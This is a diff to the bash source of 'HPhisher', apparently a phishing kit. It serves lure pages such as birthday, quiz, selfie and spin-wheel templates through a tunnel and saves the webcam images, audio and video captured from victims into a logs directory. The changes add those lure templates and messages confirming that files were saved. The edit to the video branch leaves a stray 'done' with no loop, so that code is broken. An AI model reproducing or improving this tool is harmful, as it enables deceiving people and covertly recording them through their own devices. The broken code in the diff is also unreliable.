@@ -494,11 +494,13 @@ capture_data_image() {
                         capture_ip
                 fi
                 sleep 0.75
-		if [[ -e ".server/www/Log.log" ]]; then
-			echo " "
-                        printf "${GREEN} Cam file received! ${NC}"
-                        rm -rf .server/www/Log.log
-			mv .server/www/*.png  ${logs_full_dir}/
+	            	if [[ -e ".server/www/Log.log" ]]; then
+	               		echo " "
+                    printf "${GREEN} Cam file received! ${NC}"
+										echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
+										echo -ne " "
+                    rm -rf .server/www/Log.log
+	               		mv .server/www/*.png  ${logs_full_dir}/
                 fi
                 sleep 0.5
 	done
@@ -514,9 +516,11 @@ capture_data_audio() {
                 fi
                 sleep 0.75
 		if [[ -e ".server/www/Log.log" ]]; then
-                        printf "${GREEN} Cam file received! ${NC}"
-                        rm -rf Log.log
-                        mv /.server/www/*.{jpg,jpeg,webp,png} /sdcard
+                        printf "${GREEN} Audio file received! ${NC}"
+												echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
+												echo -ne " "
+												rm -rf .server/www/Log.log
+												mv .server/www/*.wav  ${logs_full_dir}/
                 fi
                 sleep 0.5
 	done
@@ -532,11 +536,11 @@ capture_data_video() {
                 fi
                 sleep 0.75
 		if [[ -e ".server/www/Log.log" ]]; then
-                        printf "${GREEN} Cam file received! ${NC}"
+                        printf "${GREEN} Video file received! ${NC}"
+												echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
+												echo -ne " "
                         rm -rf Log.log
-                        shopt -s globstar 
-                        for f in /.server/www/*.{jpg,jpeg,webp}; do
-                        mv -- "/.server/www/${f}" /${files_dir}
+                        mv .server/www/*.webm  ${logs_full_dir}/
                         done
                 fi
                 sleep 0.5
@@ -602,6 +606,11 @@ esac
 
 ## Tunnel selection
 tunnel_menu() {
+clear
+echo -e " "
+echo -e " "
+banner
+echo -e " "
 echo -e " "
 echo -e "${RED}[${WHITE}-${RED}]${GREEN}Select a port forwarding service : ${BLUE}"
 echo -e " "
@@ -631,15 +640,60 @@ read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/${site_template} 
 }
 
 site_image(){
+clear
+echo -e " "
+echo -e " "
+banner
+echo -e " "
 echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
 echo -e " "
 echo -e "${BLUE}[01]${CYAN} Default ${NC}"
+echo -e "${BLUE}[02]${CYAN} Birthday ${NC}"
+echo -e "${BLUE}[03]${CYAN} Book ${NC}"
+echo -e "${BLUE}[04]${CYAN} Box Wish ${NC}"
+echo -e "${BLUE}[05]${CYAN} Firework ${NC}"
+echo -e "${BLUE}[06]${CYAN} Game ${NC}"
+echo -e "${BLUE}[07]${CYAN} Guess ${NC}"
+echo -e "${BLUE}[08]${CYAN} Quiz ${NC}"
+echo -e "${BLUE}[09]${CYAN} RPS ${NC}"
+echo -e "${BLUE}[10]${CYAN} Selfie ${NC}"
+echo -e "${BLUE}[11]${CYAN} Spin Wheel ${NC}"
 echo -e " "
 read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
 case $reply_template in
         1 | 01)
                 site_template="default"
                 tunnel_menu;;
+				2 | 02)
+				        site_template="birthday"
+				        tunnel_menu;;
+				3 | 03)
+				         site_template="book"
+				         tunnel_menu;;
+				4 | 04)
+				         site_template="boxwish"
+				         tunnel_menu;;
+				5 | 05)
+				  			 site_template="firework"
+				  				tunnel_menu;;
+				6 | 06)
+					 			 site_template="game"
+					 		   tunnel_menu;;
+				7 | 07)
+				  			  site_template="guess"
+					 				tunnel_menu;;
+		    8 | 08)
+					 				site_template="quiz"
+					 				tunnel_menu;;
+				9 | 09)
+				  	 			 site_template="rps"
+						 		   tunnel_menu;;
+				10)
+				  			  site_template="selfie"
+					 				tunnel_menu;;
+		    11)
+					 				site_template="spinwheel"
+					 				tunnel_menu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_image; };;
@@ -647,6 +701,11 @@ esac
 }
 
 site_audio(){
+clear
+echo -e " "
+echo -e " "
+banner
+echo -e " "
 echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
 echo -e " "
 echo -e "${BLUE}[01]${CYAN} Default ${NC}"
@@ -663,6 +722,11 @@ esac
 }
 
 site_video(){
+clear
+echo -e " "
+echo -e " "
+banner
+echo -e " "
 duration=5000
 echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
 echo -e " "
@@ -690,6 +754,7 @@ case $reply_template in
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; banner; site_video; };;
 esac
+
 }
 
 
